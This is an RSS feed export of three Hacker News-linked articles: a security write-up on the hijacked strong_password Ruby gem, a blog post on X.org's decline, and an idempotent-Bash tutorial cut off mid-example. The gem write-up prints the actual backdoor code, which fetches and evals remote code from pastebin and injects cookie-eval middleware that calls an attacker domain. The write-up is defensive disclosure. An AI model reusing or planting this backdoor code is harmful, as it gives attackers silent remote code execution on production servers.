<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Strong_password Rubygem hijacked</title>
<link>https://withatwist.dev/strong-password-rubygem-hijacked.html</link>
<guid isPermaLink="true" >https://withatwist.dev/strong-password-rubygem-hijacked.html</guid>
<description>&lt;p class=&quot;author&quot;&gt;Tute Costa &lt;span class=&quot;date&quot;&gt;July 3, 2019&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I recently updated minor and patch versions of the gems our Rails app uses. We want to keep dependencies fresh, bugs fixed, security vulnerabilities addressed while maintaining a high chance of backward compatibility with our codebase. In all, it was 25 gems we’d upgrade.&lt;/p&gt;
&lt;p&gt;I went line by line linking to each library’s changeset. &lt;strong&gt;This due diligence never reported significant surprises to me, until this time&lt;/strong&gt;. Most gems have a &lt;code&gt;CHANGELOG.md&lt;/code&gt; file that describes the changes in each version. Some do not, and I had to compare by git tags or commits list (like cocoon or bcrypt gems). The &lt;code&gt;jquery-rails&lt;/code&gt; upgrade contains a &lt;code&gt;jQuery.js&lt;/code&gt; upgrade, so the related log was in another project.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;And I couldn’t find the changes for &lt;code&gt;strong_password&lt;/code&gt;&lt;/strong&gt;. It appeared to have gone from 0.0.6 to 0.0.7, yet the last change in any branch in GitHub was from 6 months ago, and we were up to date with those. If there was new code, it existed only in &lt;code&gt;RubyGems.org&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I downloaded the gem from RubyGems and compared its contents with the latest copy in GitHub. At the end of &lt;code&gt;lib/strong_password/strength_checker.rb&lt;/code&gt; version 0.0.7 there was the following:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight ruby&quot;&gt;
&lt;/pre&gt;
&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;4.5&quot;&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;
&lt;pre class=&quot;lineno&quot;&gt;
1
2
3
4
&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&quot;rouge-code&quot; readability=&quot;6&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;rescue&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3333&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://pastebin.com/raw/xa456PFt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))}}}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Rails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;
&lt;p&gt;I checked who published it and it was an almost empty account, with a different name than the maintainer’s, with access only to this gem. I checked the maintainer’s email in GitHub and wrote to him with the prettified version of the diff:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight ruby&quot;&gt;
&lt;/pre&gt;
&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;7.5&quot;&gt;&lt;td class=&quot;rouge-gutter gl&quot; readability=&quot;5&quot;&gt;
&lt;pre class=&quot;lineno&quot;&gt;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&quot;rouge-code&quot; readability=&quot;6&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;rescue&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3333&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://pastebin.com/raw/xa456PFt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Rails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;p&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;
&lt;p&gt;In a loop within a new thread, after waiting for a random number of seconds up to about an hour, it fetches and runs the code stored in a &lt;code&gt;pastebin.com&lt;/code&gt;, only if running in production, with an empty exception handling that ignores any error it may raise.&lt;/p&gt;
&lt;p&gt;In fifteen minutes, Brian McManus wrote back:&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;The gem seems to have been pulled out from under me… When I login to rubygems.org I don’t seem to have ownership now. Bogus 0.0.7 release was created 6/25/2019.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In case the Pastebin got deleted or changed, I emailed the Pastebin that was up on June 28th at 8 PM UTC, carbon-copying Ruby on Rails’ security coordinator, &lt;a href=&quot;https://twitter.com/rafaelfranca&quot;&gt;Rafael França&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight ruby&quot;&gt;
&lt;/pre&gt;
&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;7.5&quot;&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;
&lt;pre class=&quot;lineno&quot;&gt;
1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&quot;rouge-code&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defined?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Z1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;Rack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Sendfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;prepend&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define_method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_decode64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HTTP_COOKIE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/___id=(.+);/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}}&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;Z1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(:&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;_!&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;Faraday&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://smiley.zzz.com.ua&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ENV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;URL_HOST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;
&lt;p&gt;While waiting for their answers, I tried to understand the code. If it didn’t run before (checking for the existence of the &lt;code&gt;Z1&lt;/code&gt; dummy constant) it injects a middleware that &lt;code&gt;eval&lt;/code&gt;‘s cookies named with an &lt;code&gt;___id&lt;/code&gt; suffix, only in production, all surrounded by the empty exception handler &lt;code&gt;_!&lt;/code&gt; function that’s defined in the hijacked gem, opening the door to &lt;strong&gt;silently executing remote code in production at the attacker’s will&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;It also sends a request to a controlled domain with an HTTP header informing the infected host URLs. It depends on the Faraday gem being loaded for the notification to work (which the &lt;code&gt;oauth2&lt;/code&gt; and &lt;code&gt;stripe&lt;/code&gt; gems, for example, include).&lt;/p&gt;
&lt;p&gt;Rafael França replied in 25 minutes, adding &lt;code&gt;security@rubygems.org&lt;/code&gt; to the thread. Someone at RubyGems quickly yanked it, and the next day André Arko confirmed he had yanked it, locked the &lt;code&gt;kickball&lt;/code&gt; RubyGems account, and added Brian back to the gem.&lt;/p&gt;
&lt;p&gt;I asked for a CVE identifier (Common Vulnerabilities and Exposures) to &lt;code&gt;cve-request@mitre.org&lt;/code&gt;, and they assigned CVE-2019-13354, which I used to announce the potential issue in production installations to the &lt;a href=&quot;https://github.com/rubysec/ruby-advisory-db&quot;&gt;rubysec/ruby-advisory-db&lt;/a&gt; project and the &lt;a href=&quot;https://groups.google.com/forum/#!forum/ruby-security-ann&quot;&gt;ruby-security-ann Google Group&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Sun, 07 Jul 2019 19:14:40 +0000</pubDate>
<dc:creator>jrochkind1</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://withatwist.dev/strong-password-rubygem-hijacked.html</dc:identifier>
</item>
<item>
<title>The death watch for the X Window System has probably started</title>
<link>https://utcc.utoronto.ca/%7Ecks/space/blog/unix/XDeathwatchStarts</link>
<guid isPermaLink="true" >https://utcc.utoronto.ca/%7Ecks/space/blog/unix/XDeathwatchStarts</guid>
<description>&lt;p&gt;I was recently reading Christian F.K. Schaller's &lt;a href=&quot;https://blogs.gnome.org/uraeus/2019/06/24/on-the-road-to-fedora-workstation-31/&quot;&gt;On the Road to Fedora Workstation 31&lt;/a&gt; (via both &lt;a href=&quot;http://fedoraplanet.org/&quot;&gt;Fedora Planet&lt;/a&gt; and &lt;a href=&quot;http://planet.gnome.org/&quot;&gt;Planet Gnome&lt;/a&gt;). In it, Schaller says in one section (about Gnome and their move to fully work on Wayland):&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;Once we are done with this we expect X.org to go into hard maintenance mode fairly quickly. The reality is that X.org is basically maintained by us and thus once we stop paying attention to it there is unlikely to be any major new releases coming out and there might even be some bitrot setting in over time. We will keep an eye on it as we will want to ensure X.org stays supportable until the end of the RHEL8 lifecycle at a minimum, but let this be a friendly notice for everyone who rely the work we do maintaining the Linux graphics stack, get onto Wayland, that is where the future is.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I have no idea how true this is about X.org X server maintenance, either now or in the future, but I definitely think it's a sign that developers have started saying this. If Gnome developers feel that X.org is going to be in hard maintenance mode almost immediately, they're probably pretty likely to also put the Gnome code that deals with X into hard maintenance mode. And public Gnome statements about this (and public action or lack of it) provide implicit support for KDE and any other desktop to move in this direction if they want to (and probably create some pressure to do so). I've known that Wayland was the future for &lt;a href=&quot;https://utcc.utoronto.ca/~cks/space/blog/unix/WaylandNowTheFuture&quot;&gt;some time&lt;/a&gt;, but I would still like it to not arrive any time soon.&lt;/p&gt;
&lt;p&gt;(I'm quite attached to &lt;a href=&quot;http://fvwm.org/&quot;&gt;my window manager&lt;/a&gt;, and it is very much X only. I am not holding my breath for anything very much like it, especially not as far as something like &lt;a href=&quot;https://utcc.utoronto.ca/~cks/space/blog/sysadmin/HowIUseFvwmIconMan&quot;&gt;FvwmIconMan&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Gnome's view especially matters here because of &lt;a href=&quot;https://en.wikipedia.org/wiki/GTK&quot;&gt;GTK&lt;/a&gt;, which is used as a foundation by a number of important desktop programs such as Firefox (but not Chrome, which apparently has its own toolkit system). If X support decays in GTK, a lot of programs will start being affected, and I don't know how receptive the Gnome developers would be to fixes if they consider X support to be in hard maintenance mode.&lt;/p&gt;
&lt;p&gt;(But a lot of this is worries, rather than anything concrete.)&lt;/p&gt;
&lt;p&gt;PS: I have no idea what non-Linux Unixes are going to do here, especially for NVidia hardware where driver support is already lacking and often at the mercy of NVidia's corporate priorities and indifference.&lt;/p&gt;
</description>
<pubDate>Sun, 07 Jul 2019 16:48:51 +0000</pubDate>
<dc:creator>_emacsomancer_</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://utcc.utoronto.ca/%7Ecks/space/blog/unix/XDeathwatchStarts</dc:identifier>
</item>
<item>
<title>How to write idempotent Bash scripts</title>
<link>https://arslan.io/2019/07/03/how-to-write-idempotent-bash-scripts/</link>
<guid isPermaLink="true" >https://arslan.io/2019/07/03/how-to-write-idempotent-bash-scripts/</guid>
<description>&lt;div readability=&quot;176.02968246664&quot;&gt;

&lt;span class=&quot;post-date&quot;&gt;July 3, 2019&lt;/span&gt; &lt;img src=&quot;https://d33wubrfki0l68.cloudfront.net/68bfe0b7ffe6a88ba274c0a9b5b102c333433f78/83d58/images/how-to-write-idempotent-bash-scripts-1.jpeg&quot; alt=&quot;Photo by Callum Wale on Unsplash&quot; /&gt;&lt;p&gt;Photo by Callum Wale on Unsplash&lt;/p&gt;
&lt;p&gt;It happens a lot, you write a bash script and half way it exits due an error. You fix the error in your system and run the script again. But half of the steps in your scripts fail immediately because they were already applied to your system. To build resilient systems you need to write software that is idempotent.&lt;/p&gt;
&lt;h2 id=&quot;what-is-idempotency&quot;&gt;What is idempotency?&lt;/h2&gt;
&lt;p&gt;Idempotent scripts can be called multiple times and each time it’s called, it will have the same effects on the system. This means, a second call will exit with the same result and won’t have any side effects. From the &lt;a href=&quot;https://www.google.com/search?q=idempotent&quot;&gt;dictionary&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Idempotent: denoting an element of a set which is unchanged in value when multiplied or otherwise operated on by itself.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Good software is always written in an idempotent way, especially if you’re working in distributed systems, where operations might be eventually consistency and you might end up calling functions multiple times because of duplicate requests (such as in &lt;a href=&quot;https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/standard-queues.html&quot;&gt;queues&lt;/a&gt; with &lt;code&gt;At-Least-Once&lt;/code&gt; delivery guarantee).&lt;/p&gt;
&lt;h2 id=&quot;bash-idioms&quot;&gt;Bash idioms&lt;/h2&gt;
&lt;p&gt;Let me show a couple of bash tips and idioms you can use to change your scripts to be idempotent. You’re probably using most of them without being aware of the side effects:&lt;/p&gt;
&lt;h3 id=&quot;creating-an-empty-file&quot;&gt;Creating an empty file&lt;/h3&gt;
&lt;p&gt;This is an easy one. Touch is by default idempotent. This means you can call it multiple times without any issues. A second call won’t have any effects on the file content. Note though it’ll update the file’s modification time, so if you depend on it be careful.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;touch example.txt&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;creating-a-directory&quot;&gt;Creating a directory&lt;/h3&gt;
&lt;p&gt;Never use &lt;code&gt;mkdir&lt;/code&gt; directly, instead use it with the&lt;code&gt;-p&lt;/code&gt; flag. This flag make sure mkdir won’t error if the directory exists:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mkdir -p mydir&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;creating-a-symbolic-link&quot;&gt;Creating a symbolic link&lt;/h3&gt;
&lt;p&gt;We create symbolic links with the following command:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ln -s &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; target&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But this will fail if you call it again on the same target. To make it idempotent, pass the &lt;code&gt;-f&lt;/code&gt; flag:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ln -sf &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; target&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;-f&lt;/code&gt; flag removes the target destination before creating the symbolic link, hence it’ll always succeed.&lt;/p&gt;
&lt;p&gt;When linking a directory, you need to pass &lt;code&gt;-n&lt;/code&gt; too. Otherwise calling it again will create a symbolic link inside the directory.&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mkdir a
ln -sf a b
ln -sf a b
ls a
a&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So to be safe, always use &lt;code&gt;ln -sfn source target&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;removing-a-file&quot;&gt;Removing a file&lt;/h3&gt;
&lt;p&gt;Instead of removing a file with:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;rm example.txt&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Use the &lt;code&gt;-f&lt;/code&gt; flag which ignores non-existent files.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;rm -f example.txt&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;modifying-a-file&quot;&gt;Modifying a file&lt;/h3&gt;
&lt;p&gt;Sometimes you’re adding a new line to an existing file (i.e: &lt;code&gt;/etc/fstab&lt;/code&gt;). This means, you need to make sure not to add it the second time if you run your script. Suppose you have this in your script:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/dev/sda1 /mnt/dev ext4 defaults 0 0&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sudo tee -a /etc/fstab&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If this is run again, you’ll end up having duplicate entries in your &lt;code&gt;/etc/fstab&lt;/code&gt;. One way of making this idempotent is to make sure to check for certain placeholders via &lt;code&gt;grep&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; ! grep -qF &lt;span class=&quot;s2&quot;&gt;&quot;/mnt/dev&quot;&lt;/span&gt; /etc/fstab&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/dev/sda1 /mnt/dev ext4 defaults 0 0&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sudo tee -a /etc/fstab
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
